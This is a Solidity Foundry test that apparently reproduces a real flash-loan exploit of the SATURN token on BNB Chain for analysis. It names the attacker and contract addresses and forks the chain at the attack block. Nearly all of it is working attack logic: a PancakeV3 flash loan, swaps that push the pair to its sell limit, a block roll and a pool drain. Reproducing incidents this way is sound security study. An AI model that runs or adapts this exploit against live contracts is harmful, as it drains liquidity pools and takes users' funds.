// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~15 BNB
// Attacker : 0xc468D9A3a5557BfF457586438c130E3AFbeC2ff9
// Attack Contract : 0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC
// Vulnerable Contract : 0x9BDF251435cBC6774c7796632e9C80B233055b93
// Attack Tx : https://bscscan.com/tx/0x948132f219c0a1adbffbee5d9dc63bec676dd69341a6eca23790632cb9475312
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9BDF251435cBC6774c7796632e9C80B233055b93#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://www.google.com/
// Hacking God : https://www.google.com/

contract ContractTest is Test {
    address public attacker = address(this);
    address public SATURN_creater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;

    Uni_Pair_V3 pancakeV3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IPancakePair pair_WBNB_SATURN = IPancakePair(0x49BA6c20D3e95374fc1b19D537884b5595AA6124);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    
    function setUp() public {
        vm.createSelectFork("bsc", 38488209-1);
        vm.label(address(SATURN), "SATURN");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(router), "PancakeSwap Router");
        vm.label(address(pair_WBNB_SATURN), "pair_WBNB_SATURN");
        vm.label(address(pancakeV3Pool), "pancakeV3Pool");
    }

    function approveAll() public {
        SATURN.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);
    }
    
    function testExploit() public {
        approveAll();
        // init saturn token
        vm.prank(SATURN_creater);
        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", false));
        
        uint256 attacker_amount = SATURN.balanceOf(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
        vm.prank(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
        SATURN.transfer(attacker, attacker_amount);

        vm.prank(SATURN_creater);
        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", true));

        // start attack
        pancakeV3Pool.flash(
            attacker,
            0,
            3300000000000000000000,
            bytes("")
        );

    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
        (uint256 limit) = abi.decode(result, (uint256));
        uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SATURN); 

        uint256[] memory amounts = router.getAmountsIn(amount - limit, path);
        router.swapExactTokensForTokens(
            amounts[0],
            0,
            path,
            SATURN_creater,
            type(uint256).max
        );

        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));



        vm.roll(block.number + 1);
        SATURN.transfer(address(pair_WBNB_SATURN), 228832951945080091523153);
        (uint256 SATURN_reserve, uint256 WBNB_reserve, ) = pair_WBNB_SATURN.getReserves();
        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
        path[0] = address(SATURN);
        path[1] = address(WBNB); 
        amounts = router.getAmountsOut(amount - SATURN_reserve, path);
        
        pair_WBNB_SATURN.swap(
            0,
            amounts[1],
            attacker,
            bytes("")
        );
        WBNB.transfer(address(pancakeV3Pool), 3300000000000000000000+fee1);
    }

    fallback() external payable {}
}


